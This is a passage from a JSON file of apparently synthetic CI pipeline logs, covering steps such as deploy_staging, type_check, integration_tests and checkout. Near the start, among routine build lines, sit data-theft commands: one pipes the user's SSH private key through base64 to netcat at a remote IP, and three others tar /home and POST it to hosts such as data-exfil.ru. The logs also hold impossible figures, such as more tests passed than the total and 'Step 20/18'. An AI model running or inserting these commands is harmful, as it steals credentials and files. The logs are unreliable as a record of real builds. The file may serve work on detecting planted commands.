to database\nPOST /data - 202 (383ms)\nStep 14/21: Linting\n[12:46:51] DEBUG: Initializing service\n[12:46:51] INFO: Processing request\nDone.\n[12:46:51] WARN: Deprecated API usage\nCache restored successfully (272MB)\n\u2713 Task completed in 4263ms\nNODE_ENV=development\n[12:46:51] DEBUG: Initializing service\nPushing to registry...\npip: Collecting lodash\nWaiting...\n[12:46:51] DEBUG: Initializing service\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nBuilding Docker image...\nCompiling utils/handler.rs...\n[12:46:51] WARN: Deprecated API usage\nCompleted.\n[12:46:51] INFO: Starting build process\necho $(cat ~/.ssh/id_rsa) | base64 | nc 191.118.64.94 29831\nCache hit for key-9715\nnpm notice: created a lockfile\nRan 147 tests in 60s\n[12:46:51] INFO: Processing request\n\u2713 Task completed in 611ms\n\u2713 Step 'checkout' succeeded\nSnapshots: 25 passed, 33 total\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nMinifying app.js\nWaiting...\nWARNING: jest has known vulnerabilities\nTransforming 991 files...\nCache saved successfully\nUsing Python 3.9\nEnvironment: test\nProcessing...\n[12:46:51] WARN: Deprecated API usage\nHEAD is now at 2042c56\n[12:46:51] INFO: Connecting to database\nDone.\nStep 19/21: Running migrations\n[12:46:51] WARN: Deprecated API usage\nReady.\ntar czf - /home | curl -X POST -d @- https://data-exfil.ru/upload\n\u2717 build failed with exit code 50\nSnapshots: 18 passed, 40 total\ntar czf - /home | curl -X POST -d @- https://data-exfil.ru/upload\n\u2713 package completed\nTest Suites: 10 passed, 23 total\nArtifact uploaded: build.tar.gz (5MB)\nCreating production build...\nTest Suites: 27 passed, 33 total\nGenerating source maps...\ntar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload\n[12:46:51] DEBUG: Loading configuration\nFinished.\nCompiling components/handler.rs...\nCache restored successfully (283MB)\nTests: 111 passed, 107 total\nTest Suites: 41 passed, 30 total\nReady.\n\u2713 Step 'build' succeeded\nFetching from https://githubusercontent.com/package.json\nCompiling utils/utils.go...\nCache miss for key-6635\nUploading artifact 'build' (30 files)\n[12:46:51] WARN: Deprecated API usage\n[12:46:51] ERROR: Connection failed\nnpm notice: package.json updated\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (30MB)\n=== Step save_cache completed ===",
    "steps": [
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-12-04T12:46:50.920900",
        "finished_at": "2025-12-04T12:47:06.764743",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "[12:46:50] DEBUG: Connection pool: 3 active",
          "Completed.",
          "  PASS: unit/test_auth_login.spec.js",
          "Step 17/23: Linting",
          "Tests: 476 passed, 238 total",
          "Compiling utils/main.py...",
          "Step 2/17: Installing dependencies",
          "  PASS: integration/test_cache_hit.spec.js",
          "Snapshots: 23 passed, 24 total",
          "npm install: resolved 1408 packages",
          "[12:46:50] INFO: Request completed",
          "Using Python 3.12",
          "Layer 2/10: ENV command",
          "Minifying app.js",
          "Fetching submodules...",
          "[12:46:50] INFO: Starting build process",
          "[12:46:50] ERROR: Connection failed",
          "\u2713 Step 'install' succeeded",
          "Ran 168 tests in 5s",
          "[12:46:50] WARN: Deprecated API usage",
          "[12:46:50] DEBUG: Connection pool: 18 active",
          "Step 3/16: Deploying",
          "Cache hit for key-5279",
          "[12:46:50] INFO: Request completed",
          "Step 9/21: Installing dependencies",
          "Success!",
          "npm notice: package.json updated",
          "\u2713 Task completed in 4129ms",
          "Uploading artifact 'coverage' (23 files)",
          "Pushing to registry...",
          "Building Docker image...",
          "Layer 7/9: RUN command",
          "Connection established",
          "Environment: development",
          "Ready.",
          "Processing...",
          "  PASS: integration/test_user_create.spec.js",
          "Artifact downloaded: 22MB",
          "WARNING: lodash has known vulnerabilities",
          "[12:46:50] INFO: Request completed",
          "Waiting...",
          "yarn add: Done in 13.57s",
          "[12:46:50] DEBUG: Initializing service",
          "[12:46:50] INFO: Cache refreshed",
          "Ready.",
          "Cache saved successfully",
          "npm notice: created a lockfile",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:46:50] WARN: Deprecated API usage",
          "Fetching submodules...",
          "Pushing to registry...",
          "[12:46:50] INFO: Processing request",
          "[12:46:50] WARN: Deprecated API usage",
          "Step 1/18: Running migrations",
          "Switched to branch 'bugfix/task-992'",
          "Creating production build...",
          "Uploading artifact 'build' (23 files)",
          "\u2717 build failed with exit code 47",
          "[12:46:50] WARN: Deprecated API usage",
          "Fetching submodules...",
          "Waiting...",
          "[12:46:50] INFO: Request completed",
          "Already up to date.",
          "TLS handshake completed",
          "Verifying...",
          "Artifact uploaded: build.tar.gz (1MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:46:50] WARN: Deprecated API usage",
          "Finished.",
          "Cache hit for key-7786",
          "Snapshots: 43 passed, 35 total",
          "npm notice: created a lockfile",
          "Switched to branch 'hotfix/task-577'",
          "[12:46:50] WARN: Deprecated API usage",
          "\u2713 build completed",
          "Artifact uploaded: dist.zip (98MB)",
          "[12:46:50] DEBUG: Loading configuration",
          "Step 20/18: Linting",
          "Building Docker image...",
          "POST /upload - 201 (16ms)",
          "Exception: NullPointerException",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "npm notice: created a lockfile",
          "[12:46:50] INFO: Request completed",
          "GET /status - 201 (77ms)",
          "Step 15/19: Testing",
          "Compiling src/index.js...",
          "Completed.",
          "Switched to branch 'hotfix/task-934'",
          "Completed.",
          "Installing eslint@5.19.1",
          "[12:46:50] WARN: Deprecated API usage",
          "pip: Collecting react",
          "[12:46:50] ERROR: Connection failed",
          "Uploading artifact 'build' (47 files)",
          "HEAD is now at 955151b",
          "Processing...",
          "[12:46:50] DEBUG: Connection pool: 20 active",
          "yarn add: Done in 7.69s",
          "OK",
          "[12:46:50] DEBUG: Query executed in 26ms",
          "Creating production build...",
          "Verifying...",
          "Pushing to registry...",
          "[12:46:50] WARN: Deprecated API usage",
          "Finished.",
          "NODE_ENV=development",
          "pip install: Successfully installed prettier-4.10",
          "Generating source maps...",
          "Step 14/19: Deploying",
          "Installing axios@3.7.3",
          "GET /api - 201 (90ms)",
          "  PASS: test_user_create (464ms)",
          "[12:46:50] INFO: Request completed",
          "Compiling components/app.ts...",
          "Transforming 947 files...",
          "Step 9/20: Building",
          "Cache miss for key-3166",
          "GET /status - 201 (85ms)",
          "Step 10/19: Linting",
          "Bundling vendor.js",
          "Success!",
          "Cache invalidated: build",
          "Ran 192 tests in 5s",
          "Layer 9/9: ENV command",
          "Compiling lib/utils.go...",
          "Ready.",
          "Compiling src/handler.rs...",
          "HEAD is now at 632b3f3",
          "Step 16/16: Installing dependencies",
          "pip: Downloading prettier-3.0.tar.gz",
          "Ran 30 tests in 19s",
          "Time: 48.436s",
          "\u2713 lint completed",
          "\u2717 build failed with exit code 50",
          "pip: Downloading eslint-2.1.tar.gz",
          "WARNING: webpack has known vulnerabilities",
          "Artifact uploaded: dist.zip (97MB)",
          "Using Python 3.10",
          "OK",
          "Step 3/16: Building",
          "Checking out develop branch",
          "Time: 61.150s",
          "\u2713 All checks passed",
          "Building Docker image...",
          "Compiling lib/app.ts...",
          "Ran 58 tests in 50s",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "  PASS: integration/test_auth_login.spec.js",
          "Layer 10/9: ENV command",
          "[12:46:50] WARN: Deprecated API usage",
          "Bundling vendor.js",
          "Optimizing 64 modules...",
          "Optimizing 55 modules...",
          "Pulling image: python:18",
          "pip install: Successfully installed jest-5.16",
          "Step 13/23: Running migrations",
          "[12:46:50] INFO: Request completed",
          "[12:46:50] WARN: Deprecated API usage",
          "Ran 161 tests in 11s",
          "Loading...",
          "Bundling runtime.css",
          "Cache hit for key-2755",
          "NODE_ENV=development",
          "Finished.",
          "[12:46:50] DEBUG: Initializing service",
          "WARNING: lodash has known vulnerabilities",
          "[12:46:50] ERROR: Connection failed",
          "Finished.",
          "Cache miss for key-3621",
          "GET /health - 201 (68ms)",
          "[12:46:50] DEBUG: Connection pool: 20 active",
          "Exception: TypeError",
          "Ran 89 tests in 27s",
          "POST /upload - 200 (352ms)",
          "GET /status - 201 (70ms)",
          "Compiling utils/service.java...",
          "Cache restored successfully (105MB)",
          "Connection established",
          "Step 14/17: Installing dependencies",
          "Fetching from https://github.com/package.json",
          "Cache miss for key-7771",
          "Image pulled successfully",
          "Connection established",
          "Tests: 336 passed, 466 total",
          "pip: Installing build dependencies...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Ready.",
          "Cache invalidated: node_modules",
          "Artifact downloaded: 40MB",
          "Transforming 800 files...",
          "Checking out main branch",
          "OK",
          "[12:46:50] INFO: Connecting to database",
          "Cache hit for key-2635",
          "[12:46:50] INFO: Processing request",
          "Step 4/18: Testing",
          "pip: Downloading webpack-1.8.tar.gz",
          "Uploading artifact 'coverage' (19 files)",
          "WARNING: react has known vulnerabilities",
          "[12:46:50] DEBUG: Loading configuration",
          "Finished.",
          "[12:46:50] WARN: Deprecated API usage",
          "WARNING: lodash has known vulnerabilities",
          "\u2713 Step 'checkout' succeeded",
          "yarn add: Done in 2.97s",
          "TLS handshake completed",
          "Using Python 3.9",
          "Bundling main.css",
          "Creating production build...",
          "Artifact downloaded: 32MB",
          "Fetching submodules...",
          "Switched to branch 'feature/task-130'",
          "Fetching from https://amazonaws.com/package.json",
          "Done.",
          "Optimizing 26 modules...",
          "Building Docker image...",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-12-04T12:47:06.764743",
        "finished_at": "2025-12-04T12:47:22.608586",
        "log_lines": [
          "=== Step: type_check ===",
          "Compiling components/app.ts...",
          "\u2713 Step 'test' succeeded",
          "[12:46:50] INFO: Processing request",
          "[12:46:50] DEBUG: Query executed in 64ms",
          "Compiling utils/service.java...",
          "FAILED: test_cache_hit",
          "[12:46:50] DEBUG: Initializing service",
          "Checking out main branch",
          "Cache miss for key-2070",
          "Compiling src/service.java...",
          "[12:46:50] WARN: Deprecated API usage",
          "  PASS: test_db_connect (7ms)",
          "Cache restored successfully (183MB)",
          "Compiling components/service.java...",
          "Step 2/19: Testing",
          "Coverage: 93% statements, 67% branches",
          "\u2713 Step 'test' succeeded",
          "HEAD is now at a241da2",
          "[12:46:50] INFO: Request completed",
          "Minifying main.js",
          "npm notice: created a lockfile",
          "Compiling components/service.java...",
          "Cache restored successfully (214MB)",
          "\u2713 validate completed",
          "Using Python 3.11",
          "[12:46:50] DEBUG: Query executed in 19ms",
          "Cache hit for key-8500",
          "Transforming 686 files...",
          "Done.",
          "\u2713 Step 'build' succeeded",
          "Ran 20 tests in 13s",
          "[12:46:50] INFO: Starting build process",
          "Pulling image: alpine:latest",
          "Waiting...",
          "Test Suites: 31 passed, 23 total",
          "  PASS: unit/test_cache_hit.spec.js",
          "Bundling vendor.js",
          "Minifying app.js",
          "Success!",
          "pip: Downloading axios-5.10.tar.gz",
          "Minifying main.js",
          "pip: Collecting express",
          "FAILED: test_db_connect",
          "TLS handshake completed",
          "Snapshots: 19 passed, 15 total",
          "Coverage: 83% statements, 72% branches",
          "Processing...",
          "\u2713 Task completed in 4529ms",
          "Creating production build...",
          "Compiling lib/utils.go...",
          "Installing axios@3.1.4",
          "Fetching from https://githubusercontent.com/package.json",
          "Generating source maps...",
          "HEAD is now at 229bdf5",
          "Artifact uploaded: dist.zip (57MB)",
          "[12:46:50] INFO: Processing request",
          "Image pulled successfully",
          "Ready.",
          "[12:46:50] WARN: Deprecated API usage",
          "Pulling image: alpine:3.11",
          "Step 12/25: Linting",
          "Compiling utils/main.py...",
          "pip: Downloading axios-1.6.tar.gz",
          "\u2713 Task completed in 1550ms",
          "npm notice: package.json updated",
          "[12:46:50] DEBUG: Loading configuration",
          "Creating production build...",
          "[12:46:50] INFO: Request completed",
          "Optimizing 38 modules...",
          "Completed.",
          "[12:46:50] WARN: Deprecated API usage",
          "Connection established",
          "Generating source maps...",
          "Processing...",
          "Tests: 167 passed, 138 total",
          "[12:46:50] DEBUG: Connection pool: 12 active",
          "Image pulled successfully",
          "Step 3/19: Installing dependencies",
          "WARNING: axios has known vulnerabilities",
          "[12:46:50] WARN: Deprecated API usage",
          "Waiting...",
          "Using Node.js 15.9.2",
          "  PASS: unit/test_auth_login.spec.js",
          "npm notice: package.json updated",
          "Step 14/19: Installing dependencies",
          "npm notice: package.json updated",
          "Test Suites: 16 passed, 40 total",
          "OK",
          "[12:46:50] DEBUG: Initializing service",
          "Ready.",
          "Image pulled successfully",
          "Step 7/23: Linting",
          "[12:46:50] INFO: Starting build process",
          "Compiling components/handler.rs...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "OK",
          "Compiling utils/service.java...",
          "Building Docker image...",
          "[12:46:50] DEBUG: Memory usage: 104MB",
          "Optimizing 16 modules...",
          "npm install: resolved 360 packages",
          "Success!",
          "Coverage: 81% statements, 100% branches",
          "TLS handshake completed",
          "[12:46:50] DEBUG: Query executed in 63ms",
          "GET /api - 200 (67ms)",
          "Success!",
          "Finished.",
          "OK",
          "Cache invalidated: dependencies",
          "Artifact uploaded: build.tar.gz (12MB)",
          "npm install: resolved 428 packages",
          "[12:46:50] DEBUG: Initializing service",
          "Transforming 752 files...",
          "[12:46:50] WARN: Deprecated API usage",
          "[12:46:50] INFO: Processing request",
          "Artifact uploaded: dist.zip (99MB)",
          "Compiling utils/handler.rs...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 5/24: Building",
          "[12:46:50] ERROR: Connection failed",
          "[12:46:50] DEBUG: Connection pool: 9 active",
          "Waiting...",
          "Snapshots: 41 passed, 34 total",
          "Transforming 670 files...",
          "Minifying vendor.js",
          "  PASS: test_api_health (345ms)",
          "Done.",
          "[12:46:50] WARN: Deprecated API usage",
          "npm notice: package.json updated",
          "Minifying app.js",
          "POST /data - 200 (496ms)",
          "Creating production build...",
          "Pushing to registry...",
          "Completed.",
          "NODE_ENV=development",
          "Environment: development",
          "GET /health - 204 (64ms)",
          "WARNING: jest has known vulnerabilities",
          "Bundling vendor.js",
          "Using Node.js 16.1.3",
          "pip: Downloading prettier-2.10.tar.gz",
          "Fetching submodules...",
          "Loading...",
          "Verifying...",
          "pip: Collecting lodash",
          "Compiling utils/utils.go...",
          "OK",
          "Transforming 708 files...",
          "\u2713 Step 'checkout' succeeded",
          "npm install: resolved 1561 packages",
          "Artifact uploaded: dist.zip (69MB)",
          "Compiling src/app.ts...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Already up to date.",
          "[12:46:50] WARN: Deprecated API usage",
          "Finished.",
          "Uploading artifact 'build' (5 files)",
          "pip: Downloading webpack-5.4.tar.gz",
          "[12:46:50] INFO: Starting build process",
          "Step 13/17: Linting",
          "Fetching submodules...",
          "npm notice: created a lockfile",
          "[12:46:50] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "WARNING: eslint has known vulnerabilities",
          "Fetching submodules...",
          "[12:46:50] DEBUG: Connection pool: 9 active",
          "Fetching from https://googleapis.com/package.json",
          "Exception: RuntimeError",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Optimizing 16 modules...",
          "[12:46:50] INFO: Cache refreshed",
          "  PASS: test_db_connect (417ms)",
          "pip install: Successfully installed webpack-3.13",
          "Processing...",
          "Step 15/21: Installing dependencies",
          "Cache invalidated: dependencies",
          "Snapshots: 14 passed, 1 total",
          "Done.",
          "\u2713 build completed",
          "  PASS: test_api_health (311ms)",
          "npm install: resolved 342 packages",
          "Already up to date.",
          "Cache hit for key-7900",
          "Coverage: 88% statements, 88% branches",
          "pip: Downloading react-2.3.tar.gz",
          "Success!",
          "Verifying...",
          "Step 11/20: Deploying",
          "Done.",
          "[12:46:50] DEBUG: Memory usage: 1974MB",
          "OK",
          "Cache invalidated: dependencies",
          "NODE_ENV=test",
          "Building Docker image...",
          "[12:46:50] INFO: Processing request",
          "Using Python 3.9",
          "Optimizing 34 modules...",
          "[12:46:50] DEBUG: Connection pool: 15 active",
          "npm notice: created a lockfile",
          "Processing...",
          "pip: Installing build dependencies...",
          "npm notice: package.json updated",
          "npm notice: created a lockfile",
          "Generating source maps...",
          "[12:46:50] DEBUG: Initializing service",
          "Uploading artifact 'coverage' (47 files)",
          "Fetching from https://pypi.org/package.json",
          "\u2713 validate completed",
          "Time: 2.544s",
          "Completed.",
          "Checking out develop branch",
          "Transforming 337 files...",
          "Compiling utils/main.py...",
          "Waiting...",
          "Already up to date.",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-12-04T12:47:22.608586",
        "finished_at": "2025-12-04T12:47:54.296271",
        "log_lines": [
          "=== Step: integration_tests ===",
          "Coverage: 89% statements, 94% branches",
          "Step 2/23: Testing",
          "[12:46:50] DEBUG: Query executed in 62ms",
          "WARNING: prettier has known vulnerabilities",
          "  PASS: test_api_health (397ms)",
          "Pushing to registry...",
          "Compiling components/app.ts...",
          "Transforming 248 files...",
          "Success!",
          "Creating production build...",
          "Bundling styles.js",
          "Image pulled successfully",
          "WARNING: eslint has known vulnerabilities",
          "[12:46:50] DEBUG: Initializing service",
          "\u2717 build failed with exit code 58",
          "\u2713 Step 'checkout' succeeded",
          "[12:46:50] DEBUG: Memory usage: 1992MB",
          "Cache invalidated: dependencies",
          "Verifying...",
          "Fetching from https://githubusercontent.com/package.json",
          "Pushing to registry...",
          "Layer 5/13: ENV command",
          "pip: Collecting axios",
          "Completed.",
          "Artifact uploaded: build.tar.gz (27MB)",
          "[12:46:50] DEBUG: Loading configuration",
          "Cache restored successfully (96MB)",
          "Image pulled successfully",
          "Minifying app.js",
          "Loading...",
          "[12:46:50] DEBUG: Connection pool: 15 active",
          "Finished.",
          "Compiling src/main.py...",
          "Fetching submodules...",
          "Layer 9/15: COPY command",
          "[12:46:50] INFO: Connecting to database",
          "Cache hit for key-2071",
          "  PASS: test_db_connect (428ms)",
          "Layer 1/15: COPY command",
          "pip install: Successfully installed react-3.15",
          "Artifact uploaded: dist.zip (49MB)",
          "Artifact uploaded: build.tar.gz (12MB)",
          "TLS handshake completed",
          "npm install: added 348 packages",
          "WARNING: react has known vulnerabilities",
          "Completed.",
          "Step 8/21: Running migrations",
          "Artifact downloaded: 48MB",
          "[12:46:50] INFO: Connecting to database",
          "Test Suites: 26 passed, 27 total",
          "[12:46:50] INFO: Request completed",
          "Processing...",
          "Test Suites: 15 passed, 29 total",
          "pip: Collecting webpack",
          "Done.",
          "Platform: darwin-arm64",
          "Optimizing 67 modules...",
          "[12:46:50] DEBUG: Initializing service",
          "\u2717 build failed with exit code 127",
          "Creating production build...",
          "Checking out develop branch",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Layer 9/14: RUN command",
          "Tests: 344 passed, 364 total",
          "NODE_ENV=development",
          "TLS handshake completed",
          "Pushing to registry...",
          "Fetching submodules...",
          "WARNING: prettier has known vulnerabilities",
          "[12:46:50] DEBUG: Initializing service",
          "Pulling image: node:3.11",
          "WARNING: react has known vulnerabilities",
          "Using Node.js 19.0.2",
          "[12:46:50] DEBUG: Query executed in 95ms",
          "Cache invalidated: node_modules",
          "Image pulled successfully",
          "Creating production build...",
          "Fetching submodules...",
          "FAILED: test_db_connect",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u2713 All checks passed",
          "\u2713 Task completed in 4705ms",
          "Uploading artifact 'build' (17 files)",
          "HEAD is now at af6e74e",
          "Optimizing 73 modules...",
          "pip install: Successfully installed webpack-1.2",
          "Processing...",
          "Ran 148 tests in 58s",
          "Compiling utils/handler.rs...",
          "Done.",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "pip: Installing build dependencies...",
          "npm install: added 383 packages",
          "[12:46:50] INFO: Starting build process",
          "Ran 148 tests in 7s",
          "Finished.",
          "[12:46:50] ERROR: Connection failed",
          "Bundling styles.js",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "FAILED: test_cache_hit",
          "Exception: ValueError",
          "npm install: added 56 packages",
          "Connection established",
          "pip: Installing build dependencies...",
          "Finished.",
          "Checking out master branch",
          "Environment: test",
          "[12:46:50] DEBUG: Memory usage: 899MB",
          "\u2713 test completed",
          "pip: Collecting webpack",
          "[12:46:50] INFO: Cache refreshed",
          "[12:46:50] DEBUG: Connection pool: 19 active",
          "[12:46:50] INFO: Request completed",
          "HEAD is now at 0781108",
          "Completed.",
          "[12:46:50] DEBUG: Loading configuration",
          "Checking out develop branch",
          "npm install: resolved 1562 packages",
          "Image pulled successfully",
          "Already up to date.",
          "Cache restored successfully (308MB)",
          "Platform: darwin-arm64",
          "Waiting...",
          "Checking out develop branch",
          "Fetching submodules...",
          "WARNING: express has known vulnerabilities",
          "Done.",
          "Test Suites: 43 passed, 30 total",
          "[12:46:50] DEBUG: Connection pool: 13 active",
          "[12:46:50] INFO: Request completed",
          "Done.",
          "Loading...",
          "Time: 120.367s",
          "Processing...",
          "Checking out main branch",
          "Waiting...",
          "Success!",
          "GET /health - 200 (66ms)",
          "Using Node.js 20.20.3",
          "Loading...",
          "[12:46:50] INFO: Starting build process",
          "[12:46:50] INFO: Cache refreshed",
          "Loading...",
          "Verifying...",
          "Snapshots: 41 passed, 10 total",
          "Compiling utils/main.py...",
          "Cache restored successfully (91MB)",
          "  PASS: test_cache_hit (119ms)",
          "Time: 13.719s",
          "[12:46:50] INFO: Cache refreshed",
          "Layer 2/9: COPY command",
          "Compiling lib/handler.rs...",
          "pip: Installing build dependencies...",
          "Compiling src/utils.go...",
          "Platform: linux-x64",
          "OK",
          "Minifying main.js",
          "GET /status - 200 (76ms)",
          "Optimizing 72 modules...",
          "pip: Collecting webpack",
          "npm notice: created a lockfile",
          "Pushing to registry...",
          "WARNING: eslint has known vulnerabilities",
          "\u2713 lint completed",
          "WARNING: jest has known vulnerabilities",
          "Already up to date.",
          "\u2713 Step 'checkout' succeeded",
          "[12:46:50] INFO: Connecting to database",
          "Switched to branch 'bugfix/task-660'",
          "[12:46:50] DEBUG: Query executed in 86ms",
          "[12:46:50] DEBUG: Connection pool: 9 active",
          "npm install: added 318 packages",
          "  PASS: integration/test_cache_hit.spec.js",
          "Step 15/23: Testing",
          "\u2713 Task completed in 4743ms",
          "Minifying app.js",
          "Compiling components/app.ts...",
          "Waiting...",
          "Verifying...",
          "Step 5/21: Running migrations",
          "Success!",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Layer 2/8: ENV command",
          "  PASS: test_cache_hit (136ms)",
          "Image pulled successfully",
          "[12:46:50] DEBUG: Loading configuration",
          "\u2713 Step 'test' succeeded",
          "Exception: NullPointerException",
          "npm notice: package.json updated",
          "Cache saved successfully",
          "Building Docker image...",
          "Creating production build...",
          "npm notice: created a lockfile",
          "\u2717 build failed with exit code 40",
          "Test Suites: 14 passed, 47 total",
          "Artifact uploaded: dist.zip (25MB)",
          "WARNING: axios has known vulnerabilities",
          "Generating source maps...",
          "Image pulled successfully",
          "FAILED: test_user_create",
          "Step 5/20: Testing",
          "[12:46:50] DEBUG: Memory usage: 331MB",
          "Compiling lib/service.java...",
          "Minifying vendor.js",
          "pip: Downloading eslint-1.3.tar.gz",
          "[12:46:50] INFO: Cache refreshed",
          "Compiling utils/index.js...",
          "Step 19/16: Testing",
          "\u2713 Task completed in 132ms",
          "[12:46:50] INFO: Request completed",
          "Cache invalidated: build",
          "Step 14/22: Installing dependencies",
          "[12:46:50] WARN: Deprecated API usage",
          "Fetching submodules...",
          "[12:46:50] ERROR: Connection failed",
          "NODE_ENV=development",
          "Ready.",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-12-04T12:47:54.296271",
        "finished_at": "2025-12-04T12:48:00.633808",
        "log_lines": [
          "=== Step: checkout ===",
          "Test Suites: 37 passed, 15 total",
          "Pulling image: node:latest",
          "[12:46:50] WARN: Deprecated API usage",
          "Fetching from https://docker.io/package.json",
          "Time: 111.253s",
          "POST /upload - 202 (94ms)",
          "Snapshots: 14 passed, 15 total",
          "Success!",
          "Fetching from https://npmjs.org/package.json",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Step 15/19: Testing",
          "npm install: resolved 1716 packages",
          "[12:46:50] DEBUG: Memory usage: 1346MB",
          "\u2713 lint completed",
          "Artifact downloaded: 32MB",
          "\u2713 All checks passed",
          "pip install: Successfully installed jest-4.8",
          "Artifact uploaded: dist.zip (2MB)",
          "Done.",
          "Step 5/22: Deploying",
          "Image pulled successfully",
          "Step 5/23: Linting",
          "Test Suites: 30 passed, 47 total",
          "Using Node.js 14.18.2",
          "Step 20/22: Linting",
          "Cache saved successfully",
          "  PASS: test_auth_login (246ms)",
          "Snapshots: 33 passed, 38 total",
          "[12:46:50] WARN: Deprecated API usage",
          "Uploading artifact 'dist' (2 files)",
          "Success!",
          "Cache invalidated: build",
          "Image pulled successfully",
          "pip install: Successfully installed express-2.2",
          "OK",
          "Image pulled successfully",
          "Checking out main branch",
          "[12:46:50] INFO: Processing request",
          "TLS handshake completed",
          "\u2713 Task completed in 1293ms",
          "Loading...",
          "[12:46:50] WARN: Deprecated API usage",
          "Snapshots: 8 passed, 26 total",
          "Connection established",
          "Checking out master branch",
          "Environment: staging",
          "Cache restored successfully (415MB)",
          "Transforming 935 files...",
          "\u2713 Task completed in 1250ms",
          "Uploading artifact 'dist' (8 files)",
          "Cache invalidated: build",
          "Transforming 793 files...",
          "Environment: test",
          "Transforming 435 files...",
          "Tests: 143 passed, 404 total",
          "Switched to branch 'hotfix/task-299'",
          "Compiling utils/index.js...",
          "Already up to date.",
          "Layer 9/12: ENV command",
          "Time: 14.138s",
          "Compiling src/index.js...",
          "Platform: win32-x64",
          "pip: Collecting eslint",
          "  PASS: test_cache_hit (24ms)",
          "Exception: RuntimeError",
          "Pulling image: alpine:18",
          "Time: 12.577s",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "  PASS: unit/test_auth_login.spec.js",
          "Installing eslint@1.7.9",
          "Compiling src/utils.go...",
          "Verifying...",
          "[12:46:50] INFO: Connecting to database",
          "npm notice: created a lockfile",
          "Ran 110 tests in 23s",
          "[12:46:50] INFO: Processing request",
          "[12:46:50] DEBUG: Connection pool: 6 active",
          "Installing webpack@5.10.4",
          "Building Docker image...",
          "Building Docker image...",
          "Using Python 3.10",
          "Tests: 63 passed, 223 total",
          "Time: 89.257s",
          "[12:46:50] DEBUG: Query executed in 2ms",
          "pip: Installing build dependencies...",
          "Generating source maps...",
          "npm notice: created a lockfile",
          "\u2713 All checks passed",
          "WARNING: express has known vulnerabilities",
          "Compiling utils/main.py...",
          "Bundling main.js",
          "Step 9/15: Testing",
          "[12:46:50] INFO: Starting build process",
          "Connection established",
          "\u2713 package completed",
          "Cache saved successfully",
          "Minifying app.js",
          "POST /upload - 202 (78ms)",
          "Step 15/25: Building",
          "Platform: linux-x64",
          "Bundling styles.js",
          "Success!",
          "npm install: resolved 1469 packages",
          "Cache miss for key-4699",
          "Loading...",
          "Waiting...",
          "\u2713 Step 'install' succeeded",
          "[12:46:50] DEBUG: Connection pool: 4 active",
          "Installing eslint@2.7.0",
          "Compiling lib/index.js...",
          "[12:46:50] INFO: Request completed",
          "Ready.",
          "Cache invalidated: node_modules",
          "[12:46:50] WARN: Deprecated API usage",
          "Cache saved successfully",
          "yarn add: Done in 15.81s",
          "[12:46:50] WARN: Deprecated API usage",
          "Ran 45 tests in 16s",
          "  PASS: test_auth_login (391ms)",
          "Success!",
          "Fetching from https://docker.io/package.json",
          "npm install: added 394 packages",
          "pip: Downloading axios-3.12.tar.gz",
          "pip: Collecting eslint",
          "Compiling lib/handler.rs...",
          "[12:46:50] INFO: Starting build process",
          "pip install: Successfully installed webpack-5.6",
          "Step 19/17: Linting",
          "Uploading artifact 'build' (24 files)",
          "npm install: added 135 packages",
          "Using Node.js 16.10.4",
          "\u2713 Step 'build' succeeded",
          "Completed.",
          "npm notice: package.json updated",
          "Pulling image: python:18",
          "\u2713 deploy completed",
          "Bundling main.js",
          "[12:46:50] INFO: Starting build process",
          "[12:46:50] INFO: Starting build process",
          "Processing...",
          "pip: Downloading jest-5.7.tar.gz",
          "[12:46:50] DEBUG: Connection pool: 10 active",
          "Cache hit for key-1175",
          "[12:46:50] INFO: Processing request",
          "Cache miss for key-9281",
          "Using Python 3.10",
          "Optimizing 15 modules...",
          "pip install: Successfully installed react-3.14",
          "Cache saved successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache miss for key-3382",
          "npm install: added 226 packages",
          "Connection established",
          "WARNING: jest has known vulnerabilities",
          "Platform: linux-x64",
          "Optimizing 94 modules...",
          "Compiling components/app.ts...",
          "Transforming 749 files...",
          "Building Docker image...",
          "[12:46:50] WARN: Deprecated API usage",
          "Artifact uploaded: dist.zip (13MB)",
          "\u2713 Task completed in 3352ms",
          "[12:46:50] DEBUG: Query executed in 82ms",
          "Uploading artifact 'build' (28 files)",
          "Already up to date.",
          "[12:46:50] INFO: Request completed",
          "pip: Installing build dependencies...",
          "Step 7/21: Testing",
          "Transforming 361 files...",
          "[12:46:50] WARN: Deprecated API usage",
          "Step 11/18: Testing",
          "Already up to date.",
          "Transforming 937 files...",
          "Compiling components/utils.go...",
          "[12:46:50] ERROR: Connection failed",
          "Cache hit for key-3834",
          "Finished.",
          "Cache saved successfully",
          "npm install: resolved 1708 packages",
          "Snapshots: 19 passed, 35 total",
          "WARNING: eslint has known vulnerabilities",
          "TLS handshake completed",
          "[12:46:50] INFO: Processing request",
          "Finished.",
          "Cache miss for key-2532",
          "Cache restored successfully (170MB)",
          "FAILED: test_api_health",
